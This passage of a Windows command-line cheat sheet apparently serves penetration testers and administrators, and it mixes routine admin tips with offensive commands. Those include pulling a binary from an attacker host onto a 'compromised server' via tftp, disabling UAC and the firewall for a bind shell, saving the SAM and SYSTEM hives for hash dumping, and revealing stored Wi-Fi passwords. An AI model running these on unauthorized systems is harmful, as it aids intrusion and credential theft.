C:\>for /F %i in (ips.txt) do ping -n 1 %i | find "bytes="
```

#### Set global proxy in Windows to point to IE proxy

```
C:\> netsh winhttp import proxy source=ie
```

#### Enumerate list of drivers with complete path information

```
C:\> driverquery /FO list /v
```

#### View Group Policy Objects that have been applied to a system

**Very useful during pentests**

```
C:\> gpresult /z /h outputfile.html
```

#### Reset the WMI repository to what it was when the OS was installed

**Very helpful if you have a corrupt repo**

```
C:\> winmgmt /resetrepository
```

#### Create symbolic links in Windows Vista, 7 & higher

```
C:\> mklink <link> <target>
C:\> mklink D:\newlink.txt E:\thisexists.txt
```

#### Enable the tftp client in Vista & higher

```
C:\> ocsetup TFTP /quiet
```

Pull files to a `compromised server`:

```
C:\> tftp -i attacksrv get bin.exe
```

#### Obtain list of firewall rules on a local system

```
C:\> netsh advfi fi sh rule name=all
```

**Can be combined with wmic for remote systems**

#### Get name of current domain controller

```
C:\> set log
C:\> nltest /dcname:DOMAIN
```

Get list of all DCs:

```
C:\> nltest /dclist:DOMAIN
```

#### Look at content cached in kernel mode on IIS 7 and higher

```
C:\> netsh http sh ca
```

**Useful when investigating the `MS15-034` HTTP.sys vuln**

#### Quick test to check `MS15_034`

```
C:\> curl -v -H "Range: bytes=234234-28768768" "http://host/a.png" -o a.png
```

**HTTP 416 = Vulnerable**

**HTTP 20X = Not vulnerable**

#### Get a list of all open Named pipes via Powershell

```
PS C:\> [http://System.IO.Directory ]::GetFiles("\\.\\pipe\\")
```

#### Possible `VENOM` detection on VirtualBox

```
C:\> vboxmanage list -l vms > a.txt
```

**Search 'Storage' & 'Floppy'**

#### List RDP sessions on local or remote in list format

```
PS C:\> qwinsta /server: | foreach {($_.trim() -replace "\s+",",")} | ConvertFrom-Csv
```

#### Get a list of service packs & hotfixes using wmic for remote systems listed in file

```
C:\> wmic /node:@file /output:out.txt qfe list full
```

#### Export wireless connection profiles

```
C:\> netsh wlan export profile
```

**`key=clear` allows plain text passwords**

#### Unzip using PowerShell

```
PS C:\> Add-Type -A System.IO.Compression.FileSystem;[IO.Compression.ZipFile]::ExtractToDirectory(src,dst)
```

#### Open the Network & Sharing center

```
control.exe /name Microsoft.NetworkandSharingCenter
```

**Create a shortcut of this as `ns` in `PATH` for ease**

#### Remotely stop/start ftp on several systems

```
C:\> wmic /node:@ips.txt /user:u /password:p process call create "net <start> msftpsvc"
```

#### To quickly find large files using cmd

```
C:\> forfiles /s /c "cmd /c if @fsize gtr 100000 echo @path @fsize bytes"
```

**Run from the dir you want**

#### Print RDP connections

```
for /f "delims=" %i in ('reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"') do reg query "%i"
```

#### List scheduled tasks & binaries

```
C:\> schtasks /query /fo LIST /v
```

**Weak permissions can be exploited for `localprivilege escalation`**

#### Display the "Stored User names and Passwords" window

```
C:\> rundll32 keymgr.dll,KRShowKeyMgr
```

#### List namespaces & classes in WMI via PowerShell

```
PS C:\> gwmi -n root -cl __Namespace | Select name

PS C:\> gwmi -n root\cimv2 -li
```

#### Convert Between VDI, VMDK, VHD, RAW disk images using VirtualBox

```
C:\> vboxmanage clonehd myvdi.vdi myvmdk.vmdk --format VMDK
```

#### Change file extensions recursively

**csv to xls example**

```
C:\Projects> forfiles /S /M *.csv /C "cmd /c ren @file @fname.xls"
```

#### List IPs of running VirtualBox machines

```
for /F %i in ('VBoxManage list runningvms') do VBoxManage guestproperty enumerate %i | find "IP"
```

#### Windows Privilege Escalation Slideshow

[![Windows Privilege Escalation](https://github.com/madhuakula/wincmdfu/raw/master/images/windows-privilege-esclation.png)](http://www.slideshare.net/riyazwalikar/windows-privilege-escalation)

#### Enumerate packages with their OEM .inf filenames

```
C:\> pnputil -e
```

#### Install a driver package using .inf file

```
C:\> pnputil -i -a path_to_inf
```

#### Malware Hunting with Mark Russinovich and the Sysinternals

[<img src="https://camo.githubusercontent.com/6b3e069a3767ac14b74715d37bd3eddbdd4d9dcc/687474703a2f2f696d672e796f75747562652e636f6d2f76692f383076665441394c72424d2f302e6a7067" alt="Malware Hunting with Mark Russinovich and the Sysinternals Tools" data-size="original">](https://www.youtube.com/watch?v=80vfTA9LrBM)

#### Windows Nano Server APIs

[https://msdn.microsoft.com/en-us/library/mt588480(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/mt588480\(v=vs.85\).aspx)

### Start a Wi-Fi hotspot using cmd.exe

Open cmd.exe in admin mode

```
netsh wlan show drivers

#if Hosted Network supported: Yes
netsh wlan set hostednetwork mode=allow ssid=$ESSID key=$password
netsh wlan start hostednetwork

#to stop
netsh wlan stop hostednetwork

#to check the status of the WiFi hotspot
netsh wlan show hostednetwork
```

#### Disable UAC via cmdline

```
C:\> reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v EnableLUA /t REG_DWORD /d 0 /f
```

#### Turn off Windows firewall for all profiles

Useful if you have a bind shell

```
C:\> netsh advfirewall set allprofiles state off
```

#### List Missing Updates

```
PS C:\> (New-Object -c Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0").Updates|Select Title
```

#### Export SAM and SYSTEM Dump password hashes offline

```
C:\>reg save HKLM\SAM SAM
C:\>reg save HKLM\SYSTEM SYSTEM
```

#### Convert Binary to base64 string to transfer across restricted RDP

```
PS C:\> [Convert]::ToBase64String((gc -Pa "a.exe" -En By))
```

#### Convert Base64 string to Binary

```
PS C:\> sc -Path "a.exe" -Val ([Convert]::FromBase64String((gc -Pa "b64.txt" ))) -En By
```

#### List services running as SYSTEM and possibly weak file permissions

```
wmic service where StartName="LocalSystem"|findstr /IV ":\WIN :\PROG"
```

#### Check Bitlocker status on a remote box

```
manage-bde -status -cn <box>
```

Use `wmic /node:@ips.txt` & `process` alias for multiple.

#### Export failed logon attempts

```
PS C:\> Get-EventLog -Log Security | ?{$_.EntryType -eq 'FailureAudit'} | epcsv log.csv
```

#### Alternate Data Streams and PS

* List all ADS for all files in current dir

```
PS C:\> gi * -s *
```

* Read ADS

```
PS C:\> gc <file> -s <ADSName>
```

* Create ADS using text input

```
PS C:\> sc <file> -s <ADSName>
```

* Delete ADS

```
PS C:\> ri <file> -s <ADSName>
```

#### Run the Windows Assessment tool for cpu and ram and disk

```
C:\> winsat cpuformal -v
C:\> winsat memformal -v
C:\> winsat diskformal -v
```

#### Port forward (proxy) traffic to remote host and port

```
C:\> netsh int p add v4tov4 <LPORT> <RHOST> [RPORT] [LHOST]
```

#### Enable/Disable NetBIOS over TCP/IP

```
Step 1. Get Index of Network Adapter:
C:\> wmic nicconfig get caption,index

Step 2. Use the index 
C:\> wmic nicconfig where index=1 call SetTcpipNetbios 1

0-Def
1-En
2-Dis
```

#### Compact multiple VDI files across folders

```
C:\> for /F %i in ('dir /b /s *.vdi ^| find ".vdi"') do vboxmanage modifyhd --compact %i
```

#### Full scan using WinDefender

```
C:\>"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -scan -scantype 2

Use #wmic /node:@ips process for multiple.
```

#### Generate 32 char random password

```
PS C:\> ([char[]](38..126)|sort{Get-Random})[0..32] -join ''
```

## Misc

`echo %cd%` - Same as pwd in Linux

### Find files by name with cmd.exe

#### For files in %PATH%

`where $filename`

#### For files not in `%PATH%`

```bash
where /R C:\ ping.exe 2>null
```

### Find file by name with PowerShell

`Get-Childitem -Path C: -Recurse -ErrorAction SilentlyContinue | ? {$_.Name = $filename}`

* you can use wildcards here for name and for extension (e.g. `pass*` could match password)

### Resolve IP to Hostname&#xD;

`[System.Net.Dns]::GetHostByAddress('$IP').HostName`

### **PowerShell 'Watch' Command**

`while (1) { $command_to_watch ; sleep 5}`

### Get WiFi Passwords <a href="#246a" id="246a"></a>

First, you have to know the SSID of the access point (AP) to get the password from

```
netsh wlan show profiles
```

Next, get the cleartext password:

```
netsh wlan show profile $SSID key=clear
```

### Gather hostnames of machines on a network

```bash
#!/bin/bash

##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
#GitHub  : https://github.com/paranoidninja/alpha-stage-scripts/blob/master/dns_lookup_ad.sh
##Descr  : A Script to gather hostnames of machines within a domain

i="0"

while [ $i -lt "255" ]
do nslookup 10.11.1.$i 10.11.1.220 | grep -v "NXDOMAIN" | grep name | cut -f1,3 -d" "
	i=$[ $i+1 ]
done
```

## References

* [https://docs.microsoft.com/en-us/sysinternals/](https://docs.microsoft.com/en-us/sysinternals/)
* [https://docs.microsoft.com/en-us/powershell/](https://docs.microsoft.com/en-us/powershell/)
* [https://github.com/madhuakula/wincmdfu](https://github.com/madhuakula/wincmdfu)
* [https://sysnetdevops.com/2017/04/24/exploring-the-powershell-alternative-to-netstat/](https://sysnetdevops.com/2017/04/24/exploring-the-powershell-alternative-to-netstat/)
* [https://techexpert.tips/powershell/powershell-list-open-udp-ports/](https://techexpert.tips/powershell/powershell-list-open-udp-ports/)
* [https://www.lepide.com/how-to/list-all-user-accounts-on-a-windows-system-using-powershell.html](https://www.lepide.com/how-to/list-all-user-accounts-on-a-windows-system-using-powershell.html)
* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)



If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
